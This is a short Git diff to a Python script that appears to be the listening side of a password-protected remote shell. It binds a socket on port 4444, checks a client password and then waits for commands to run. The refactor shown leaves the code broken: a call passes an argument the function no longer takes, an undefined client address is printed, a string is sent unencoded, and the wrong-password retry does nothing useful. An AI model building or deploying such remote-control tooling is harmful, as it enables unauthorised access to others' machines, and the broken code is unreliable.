@@ -2,19 +2,13 @@ import socket
 import subprocess
 
 
-def lookForConnection(server, passwords_match):
+def lookForConnection(server):
     server.listen(1)
     client, client_addr = server.accept()
     client.send(("Input password for client: ").encode())
     password = client.recv(1024)
     password = password.decode()
-    if password == real_password:
-        passwords_match = True
-    else:
-        client.send(("Incorrect Password...Closing Connection").encode())
-        client.close()
-    print(str(client_addr) + " has connected to the server")
-    return passwords_match, client
+    return password, client
 
 HOST = '10.0.2.5'
 PORT = 4444 
@@ -24,7 +18,15 @@ server = socket.socket()
 server.bind((HOST, PORT))
 print('Server Started')
 print('Listening For Client Connection')
-passwords_match, client = lookForConnection(server, passwords_match)
+password, client = lookForConnection(server, passwords_match)
+if password == real_password:
+    passwords_match = True
+    print(str(client_addr) + " has connected to the server")
+    client.send(("Connected!"))
+else:
+    client.send(("Incorrect Password...Closing Connection").encode())
+    client.close()
+    password, client = lookForConnection(server, passwords_match)
 
 while passwords_match == True:
     print("[-] Awaiting commands...")
